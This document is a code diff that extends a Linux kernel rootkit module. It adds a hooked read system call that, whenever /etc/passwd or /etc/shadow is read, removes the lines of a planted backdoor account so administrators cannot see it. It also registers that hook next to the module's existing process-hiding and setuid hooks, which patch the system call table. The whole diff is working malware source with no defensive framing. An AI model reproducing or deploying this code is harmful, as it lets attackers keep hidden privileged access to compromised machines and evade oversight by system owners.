@@ -124,6 +124,118 @@ exit_unlock:
     return getdents_ret;
 }
 
+asmlinkage long hacked_read(unsigned int fd, char *buf, size_t count)
+{
+	unsigned long ret;
+
+	char *tmp;
+	char *pathname;
+
+	struct file *file;
+	struct path *path;
+
+	char *tmp_buf;
+
+	ret = (*orig_read)(fd, buf, count);
+
+	if(ret <= 0){
+		return ret;
+	}
+
+	file = fget(fd);
+
+	if(!file){
+		DEBUG("file doesn't exist");
+		return ret;
+	}
+
+	path = &file->f_path;
+	path_get(path);
+
+	tmp = (char *)__get_free_page(GFP_TEMPORARY);
+
+	if(!tmp){
+		path_put(path);
+		DEBUG("couldnt create tmp");
+		return ret;
+	}
+
+	pathname = d_path(path, tmp, PAGE_SIZE);
+	path_put(path);
+
+	if(IS_ERR(pathname)){
+		free_page((unsigned long)tmp);
+		DEBUG("pathname errors");
+		return ret;
+	}
+
+	free_page((unsigned long)tmp);
+
+	if(strcmp(pathname, PASSWD_FILE)==0){
+
+		if(!(strstr(buf, BACKDOOR_PASSWD))){
+			return ret;
+		}
+
+		tmp_buf = kmalloc(ret, GFP_KERNEL);
+		if(!tmp_buf){
+			return ret;
+		}
+
+		copy_from_user(tmp_buf, buf, ret);
+
+		if(!tmp_buf){
+			kfree(tmp_buf);
+			return ret;
+		}
+
+		if((strstr(tmp_buf, BACKDOOR_PASSWD))){
+			char *strBegin  = tmp_buf;
+			char *substrBegin = strstr(strBegin, BACKDOOR_PASSWD);
+			char *substrEnd = substrBegin + strlen(BACKDOOR_PASSWD);
+			int remaining_length = (int)(strlen(substrEnd)) + 1 ;
+			memmove(substrBegin, substrEnd, remaining_length);
+			ret = ret - strlen(BACKDOOR_PASSWD);
+		}
+
+		copy_to_user(buf, tmp_buf, ret);
+		kfree(tmp_buf);
+	}
+
+	if(strcmp(pathname, SHADOW_FILE)==0){
+
+		if(!(strstr(buf, BACKDOOR_SHADOW))){
+			return ret;
+		}
+		
+		tmp_buf = kmalloc(ret, GFP_KERNEL);
+		if(!tmp_buf){
+			return ret;
+		}
+
+		copy_from_user(tmp_buf, buf, ret);
+
+		if(!tmp_buf){
+			kfree(tmp_buf);
+			return ret;
+		}
+
+		if((strstr(tmp_buf, BACKDOOR_SHADOW))){
+			char *strBegin  = tmp_buf;
+			char *substrBegin = strstr(strBegin, BACKDOOR_SHADOW);
+			char *substrEnd = substrBegin + strlen(BACKDOOR_SHADOW);
+			int remaining_length = (int)(strlen(substrEnd)) + 1 ;
+			memmove(substrBegin, substrEnd, remaining_length);
+			ret = ret - strlen(BACKDOOR_SHADOW);
+		}
+
+		copy_to_user(buf, tmp_buf, ret);
+		kfree(tmp_buf);		
+	}
+
+	return ret;	
+}
+
 void set_addr_rw(unsigned long addr)
 {
     unsigned int level;
@@ -151,6 +263,16 @@ void exit_hide_processes(void)
     UNHOOK_SYSCALL(sys_call_table, orig_getdents, __NR_getdents);
 }
 
+void init_filter_backdoor(void)
+{
+	HOOK_SYSCALL(sys_call_table, orig_read, hacked_read, __NR_read);
+}
+
+void exit_filter_backdoor(void)
+{
+	UNHOOK_SYSCALL(sys_call_table, orig_read, __NR_read);
+}
+
 static int __init initModule(void)
 {
     sys_call_table = (unsigned long**)kallsyms_lookup_name("sys_call_table");
@@ -164,6 +286,8 @@ static int __init initModule(void)
     HOOK_SYSCALL(sys_call_table, orig_setuid, hacked_setuid, __NR_setuid);
 
     init_hide_processes();
+
+    init_filter_backdoor();
 
     set_addr_ro((unsigned long) sys_call_table);
 
@@ -179,6 +303,8 @@ static void __exit exitModule(void)
     UNHOOK_SYSCALL(sys_call_table, orig_setuid, __NR_setuid);
 
     exit_hide_processes();
+
+    exit_filter_backdoor();
 
     set_addr_ro((unsigned long) sys_call_table);
     DEBUG("exiting module");
